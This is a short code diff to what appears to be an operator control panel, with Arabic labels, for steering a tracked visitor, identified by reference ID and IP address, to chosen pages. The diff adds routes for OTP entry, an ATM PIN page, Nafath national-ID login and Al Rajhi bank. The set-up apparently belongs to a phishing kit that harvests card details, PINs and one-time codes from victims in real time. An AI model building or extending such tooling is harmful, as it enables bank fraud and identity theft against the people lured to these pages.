@@ -854,11 +854,13 @@
     h += `<div class="nav-section">
       <div class="nav-sec-title"><i class="bi bi-send"></i> توجيه العميل إلى صفحة</div>
       <div class="nav-btns">
-        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/payment')"><i class="bi bi-credit-card" style="color:#16a34a"></i>الدفع</button>
-        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/nafath')"><i class="bi bi-phone" style="color:#7c3aed"></i>نفاذ</button>
-        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/motasel')"><i class="bi bi-telephone" style="color:#ea580c"></i>المتصل</button>
-        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/booking')"><i class="bi bi-car-front" style="color:#2563eb"></i>الحجز</button>
-        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/')"><i class="bi bi-house" style="color:#64748b"></i>الرئيسية</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','payments')"><i class="bi bi-credit-card" style="color:#16a34a"></i>الدفع</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','phone')"><i class="bi bi-phone" style="color:#0ea5e9"></i>OTP</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','pin')"><i class="bi bi-lock" style="color:#f59e0b"></i>ATM</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','nafad')"><i class="bi bi-shield-check" style="color:#7c3aed"></i>نفاذ</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','rajhi')"><i class="bi bi-bank" style="color:#16a34a"></i>الراجحي</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','booking')"><i class="bi bi-car-front" style="color:#2563eb"></i>الحجز</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','home')"><i class="bi bi-house" style="color:#64748b"></i>الرئيسية</button>
       </div>
     </div>`;
     return h;
